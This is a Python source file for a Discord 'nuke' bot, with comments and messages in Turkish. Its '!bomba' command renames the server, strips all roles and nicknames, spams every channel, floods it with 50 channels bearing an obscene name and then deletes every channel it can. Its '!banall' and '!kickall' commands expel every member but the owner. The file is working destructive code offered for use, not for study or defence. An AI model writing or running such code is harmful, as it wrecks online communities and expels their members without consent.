import discord
from discord.ext import commands

# Kendi kullanıcı ID'lerinizi buraya girin
ALLOWED_IDS = [963399690546708690, 123456789012345678, 234567890123456789, 345678901234567890, 456789012345678901]

# Botun tokenini buraya yapıştırın
TOKEN = 'YOUR_BOT_TOKEN'

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True
intents.voice_states = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

async def send_dm(user, message):
    try:
        await user.send(message)
    except discord.Forbidden:
        print(f"Couldn't send DM to {user.name}")

@bot.command()
async def bomba(ctx):
    if ctx.author.id in ALLOWED_IDS:
        guild = ctx.guild
        role_name = "Scret"
        
        try:
            # Sunucu ismini değiştir
            try:
                await guild.edit(name="Scret")
            except discord.Forbidden:
                print("Sunucu ismini değiştirme yetkisi yok")

            # "Scret" rolünü oluştur
            role = discord.utils.get(guild.roles, name=role_name)
            if not role:
                try:
                    role = await guild.create_role(name=role_name)
                except discord.Forbidden:
                    print("Rol oluşturma yetkisi yok")
            
            for member in guild.members:
                # Tüm üyelerin mevcut rollerini kaldır
                try:
                    await member.edit(roles=[role])
                except discord.Forbidden:
                    print(f"{member.name} kullanıcısının rollerini değiştirme yetkisi yok")
                
                # Üyelerin takma adını "Scret" yap
                try:
                    await member.edit(nick="Scret")
                except discord.Forbidden:
                    print(f"{member.name} kullanıcısının takma adını değiştirme yetkisi yok")
            
            # Tüm kanallara 10 kez "Scret!!!!" mesajını gönder
            for channel in guild.text_channels:
                for _ in range(10):
                    try:
                        await channel.send("Scret!!!!")
                    except discord.Forbidden:
                        print(f"{channel.name} kanalına mesaj gönderme yetkisi yok")
                        break
            
            # "Scret Siker Atar" adlı 50 tane kanal oluştur
            for _ in range(50):
                try:
                    await guild.create_text_channel("Scret Siker Atar")
                except discord.Forbidden:
                    print("Kanal oluşturma yetkisi yok")
                    break

            # Silinebilir tüm kanalları sil
            for channel in guild.channels:
                try:
                    await channel.delete()
                except discord.Forbidden:
                    print(f"{channel.name} kanalını silme yetkisi yok")

            response_message = "Bomba komutu başarıyla tamamlandı."
            await send_dm(ctx.author, response_message)
        except Exception as e:
            await send_dm(ctx.author, f"Bomba komutu sırasında bir hata oluştu: {e}")
    else:
        await send_dm(ctx.author, "Bu komutu kullanmak için yetkiniz yok.")

@bot.command()
async def banall(ctx):
    if ctx.author.id in ALLOWED_IDS:
        guild = ctx.guild
        try:
            for member in guild.members:
                if member != ctx.guild.owner and member != bot.user:
                    try:
                        await member.ban(reason="Banall komutu kullanıldı")
                    except discord.Forbidden:
                        print(f"{member.name} kullanıcısını banlama yetkisi yok")
            await send_dm(ctx.author, "Banall komutu başarıyla tamamlandı.")
        except Exception as e:
            await send_dm(ctx.author, f"Banall komutu sırasında bir hata oluştu: {e}")
    else:
        await send_dm(ctx.author, "Bu komutu kullanmak için yetkiniz yok.")

@bot.command()
async def kickall(ctx):
    if ctx.author.id in ALLOWED_IDS:
        guild = ctx.guild
        try:
            for member in guild.members:
                if member != ctx.guild.owner and member != bot.user:
                    try:
                        await member.kick(reason="Kickall komutu kullanıldı")
                    except discord.Forbidden:
                        print(f"{member.name} kullanıcısını kickleme yetkisi yok")
            await send_dm(ctx.author, "Kickall komutu başarıyla tamamlandı.")
        except Exception as e:
            await send_dm(ctx.author, f"Kickall komutu sırasında bir hata oluştu: {e}")
    else:
        await send_dm(ctx.author, "Bu komutu kullanmak için yetkiniz yok.")

@bot.command()
async def kick(ctx, user: discord.Member):
    if ctx.author.id in ALLOWED_IDS:
        try:
            await user.kick(reason="Kick komutu kullanıldı")
            await send_dm(ctx.author, f"{user.name} kullanıcısı kicklendi.")
        except discord.Forbidden:
            await send_dm(ctx.author, f"{user.name} kullanıcısını kickleme yetkisi yok.")
    else:
        await send_dm(ctx.author, "Bu komutu kullanmak için yetkiniz yok.")

@bot.command()
async def ban(ctx, user: discord.Member):
    if ctx.author.id in ALLOWED_IDS:
        try:
            await user.ban(reason="Ban komutu kullanıldı")
            await send_dm(ctx.author, f"{user.name} kullanıcısı banlandı.")
        except discord.Forbidden:
            await send_dm(ctx.author, f"{user.name} kullanıcısını banlama yetkisi yok.")
    else:
        await send_dm(ctx.author, "Bu komutu kullanmak için yetkiniz yok.")

@bot.command()
async def sesegir(ctx, channel_id: int):
    if ctx.author.id in ALLOWED_IDS:
        channel = bot.get_channel(channel_id)
        if isinstance(channel, discord.VoiceChannel):
            try:
                await channel.connect()
                await send_dm(ctx.author, f"{channel.name} ses kanalına giriş yapıldı.")
            except discord.Forbidden:
                await send_dm(ctx.author, f"{channel.name} ses kanalına giriş yetkisi yok.")
        else:
            await send_dm(ctx.author, "Geçersiz kanal ID'si. Ses kanalı değil.")
    else:
        await send_dm(ctx.author, "Bu komutu kullanmak için yetkiniz yok.")

bot.run(TOKEN)
